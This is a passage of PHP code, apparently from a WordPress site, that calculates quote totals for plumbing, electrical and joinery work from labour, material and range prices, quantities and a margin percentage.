                                        $doors_total = $doors_total + ( $range_price_total * $extra_count );
                                }

                        }
                }

                $windows = $data['windows'];
                $windows_total = 0;
                foreach($windows_data as $temp) {
                        if( in_array($temp['title'],$windows) || $temp['title'] == $windows ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($windows_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$windows_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $windows_total = $windows_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($windows_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $windows_total = $windows_total + ( $range_price_total * $extra_count );
                                }

                        }
                }

                $trim = $data['trim'];
                $trim_total = 0;
                foreach($trim_data as $temp) {
                        if( in_array($temp['title'],$trim) || $temp['title'] == $trim ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($trim_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$trim_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $trim_total = $trim_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($trim_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $trim_total = $trim_total + ( $range_price_total * $extra_count );
                                }

                        }
                }

                $misc = $data['misc'];
                $misc_total = 0;
                foreach($misc_data as $temp) {
                        if( in_array($temp['title'],$misc) || $temp['title'] == $misc ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($misc_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$misc_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $misc_total = $misc_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($misc_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $misc_total = $misc_total + ( $range_price_total * $extra_count);
                                }

                        }
                }

                $general_building_total = $general_total + $demo_total + $doors_total + $windows_total + $trim_total + $misc_total;

                $total = $total + $general_building_total;

        }

        // V2 formulas for Plumbing & Gasfitting template
        if(get_the_title($t) == 'Plumbing and Gasfitting') {

                $all_scope_data = get_field('quote_fields',$t);

                foreach($all_scope_data as $d) {
                        if($d['slug'] == 'type') {
                                $type_title = $d['title'];
                                $type_prices = $d['type_of_price'];
                                $type_data = $d['fields'];
                        }
                        if($d['slug'] == 'fixtures') {
                                $fixtures_title = $d['title'];
                                $fixtures_prices = $d['type_of_price'];
                                $fixtures_data = $d['fields'];
                        }
                        if($d['slug'] == 'gas') {
                                $gas_title = $d['title'];
                                $gas_prices = $d['type_of_price'];
                                $gas_data = $d['fields'];
                        }
                        if($d['slug'] == 'maintain') {
                                $maintain_title = $d['title'];
                                $maintain_prices = $d['type_of_price'];
                                $maintain_data = $d['fields'];
                        }
                }

                $type = $data['type'];
                $type_total = 100;
                foreach($type_data as $temp) {
                        if( in_array($temp['title'],$type) || $temp['title'] == $type ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($type_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$type_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $type_total = $type_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($type_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $type_total = $type_total + ( $range_price_total * $extra_count );
                                }

                        }
                }

                $fixtures = $data['fixtures'];
                $fixtures_total = 0;
                foreach($fixtures_data as $temp) {
                        if( in_array($temp['title'],$fixtures) || $temp['title'] == $fixtures ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($fixtures_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$fixtures_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $fixtures_total = $fixtures_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($fixtures_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $fixtures_total = $fixtures_total + ( $range_price_total * $extra_count );
                                }

                        }
                }

                $gas = $data['gas'];
                $gas_total = 0;
                foreach($gas_data as $temp) {
                        if( in_array($temp['title'],$gas) || $temp['title'] == $gas ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($gas_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$gas_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $gas_total = $gas_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($gas_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $gas_total = $gas_total + ( $range_price_total * $extra_count );
                                }

                        }
                }

                $maintain = $data['maintain'];
                $maintain_total = 0;
                foreach($maintain_data as $temp) {
                        if( in_array($temp['title'],$maintain) || $temp['title'] == $maintain ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($maintain_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$maintain_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $maintain_total = $maintain_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($maintain_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $maintain_total = $maintain_total + ( $range_price_total * $extra_count );
                                }

                        }
                }


                $plumbing_gas_total = $type_total + $fixtures_total + $gas_total + $maintain_total;

                $total = $total + $plumbing_gas_total;

        }

        // V2 formulas for Electrical template
        if(get_the_title($t) == 'Electrical') {

                $all_scope_data = get_field('quote_fields',$t);

                foreach($all_scope_data as $d) {
                        if($d['slug'] == 'type_install') {
                                $type_install_title = $d['title'];
                                $type_install_prices = $d['type_of_price'];
                                $type_install_data = $d['fields'];
                        }
                        if($d['slug'] == 'power') {
                                $power_title = $d['title'];
                                $power_prices = $d['type_of_price'];
                                $power_data = $d['fields'];
                        }
                        if($d['slug'] == 'light') {
                                $light_title = $d['title'];
                                $light_prices = $d['type_of_price'];
                                $light_data = $d['fields'];
                        }
                        if($d['slug'] == 'advanced') {
                                $advanced_title = $d['title'];
                                $advanced_prices = $d['type_of_price'];
                                $advanced_data = $d['fields'];
                        }
                        if($d['slug'] == 'heat') {
                                $heat_title = $d['title'];
                                $heat_prices = $d['type_of_price'];
                                $heat_data = $d['fields'];
                        }
                }

                $type_install = $data['type_install'];
                $type_install_total = 0;
                foreach($type_install_data as $temp) {
                        if( in_array($temp['title'],$type_install) || $temp['title'] == $type_install ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($type_install_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$type_install_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $type_install_total = $type_install_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($type_install_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $type_install_total = $type_install_total + ( $range_price_total * $extra_count );
                                }

                        }
                }

                $power = $data['power'];
                $power_total = 0;
                foreach($power_data as $temp) {
                        if( in_array($temp['title'],$power) || $temp['title'] == $power ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($power_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$power_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $power_total = $power_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($power_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $power_total = $power_total + ( $range_price_total * $extra_count );
                                }

                        }
                }

                $light = $data['light'];
                $light_total = 0;
                foreach($light_data as $temp) {
                        if( in_array($temp['title'],$light) || $temp['title'] == $light ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($light_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$light_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $light_total = $light_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($light_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $light_total = $light_total + ( $range_price_total * $extra_count );
                                }

                        }
                }

                $advanced = $data['advanced'];
                $advanced_total = 0;
                foreach($advanced_data as $temp) {
                        if( in_array($temp['title'],$advanced) || $temp['title'] == $advanced ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($advanced_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$advanced_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $advanced_total = $advanced_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($advanced_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $advanced_total = $advanced_total + ( $range_price_total * $extra_count );
                                }

                        }
                }

                $heat = $data['heat'];
                $heat_total = 0;
                foreach($heat_data as $temp) {
                        if( in_array($temp['title'],$heat) || $temp['title'] == $heat ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($heat_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$heat_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $heat_total = $heat_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($heat_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $heat_total = $heat_total + ( $range_price_total * $extra_count );
                                }

                        }
                }


                $electrical_total = $type_install_total + $power_total + $light_total + $advanced_total + $heat_total;

                $total = $total + $electrical_total;

        }

        // V2 formulas for Joinery template
        if(get_the_title($t) == 'Joinery') {

                $all_scope_data = get_field('quote_fields',$t);

                foreach($all_scope_data as $d) {
                        if($d['slug'] == 'type') {
                                $type_install_title = $d['title'];
                                $type_install_prices = $d['type_of_price'];
                                $type_install_data = $d['fields'];
                        }
                        if($d['slug'] == 'current') {
                                $current_title = $d['title'];
                                $current_prices = $d['type_of_price'];
                                $current_data = $d['fields'];
                        }
                        if($d['slug'] == 'doors') {
                                $doors_title = $d['title'];
                                $doors_prices = $d['type_of_price'];
                                $doors_data = $d['fields'];
                        }
                        if($d['slug'] == 'windows') {
                                $windows_title = $d['title'];
                                $windows_prices = $d['type_of_price'];
                                $windows_data = $d['fields'];
                        }
                        if($d['slug'] == 'misc') {
                                $misc_title = $d['title'];
                                $misc_prices = $d['type_of_price'];
                                $misc_data = $d['fields'];
                        }
                }

                $type_install = $data['type'];
                $type_install_total = 0;
                foreach($type_install_data as $temp) {
                        if( in_array($temp['title'],$type_install) || $temp['title'] == $type_install ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($type_install_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$type_install_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $type_install_total = $type_install_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($type_install_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $type_install_total = $type_install_total + ( $range_price_total * $extra_count );
                                }

                        }
                }

                $current = $data['current'];
                $current_total = 0;
                foreach($current_data as $temp) {
                        if( in_array($temp['title'],$current) || $temp['title'] == $current ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($current_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$current_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $current_total = $current_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($current_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $current_total = $current_total + ( $range_price_total * $extra_count );
                                }

                        }
                }

                $doors = $data['doors'];
                $doors_total = 0;
                foreach($doors_data as $temp) {
                        if( in_array($temp['title'],$doors) || $temp['title'] == $doors ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($doors_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$doors_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $doors_total = $doors_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($doors_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $doors_total = $doors_total + ( $range_price_total * $extra_count );
                                }

                        }
                }

                $windows = $data['windows'];
                $windows_total = 0;
                foreach($windows_data as $temp) {
                        if( in_array($temp['title'],$windows) || $temp['title'] == $windows ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($windows_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$windows_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $windows_total = $windows_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($windows_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $windows_total = $windows_total + ( $range_price_total * $extra_count );
                                }

                        }
                }

                $misc = $data['misc'];
                $misc_total = 0;
                foreach($misc_data as $temp) {
                        if( in_array($temp['title'],$misc) || $temp['title'] == $misc ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($misc_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$misc_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $misc_total = $misc_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($misc_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $misc_total = $misc_total + ( $range_price_total * $extra_count );
                                }

                        }
                }


                $percent_total = $misc_total + $type_install_total;
                $joinery_sub = ($doors_total + $windows_total) * $percent_total / 100;
                $joinery_total  = $joinery_total + $joinery_sub + $doors_total + $windows_total + $current_total;

                $total = $total + $joinery_total;

        }

        $margin = $data['scopeMargin'];
        if(!$margin) {
            $margin = 0;
        }
        $marginTotal = $total * $margin / 100;
        $total = $total + $marginTotal;
        $total = number_format($total, 2, '.', '');
        $object->string = $fencing_total;
        $object->total = $total;

        return $object;
}

?>
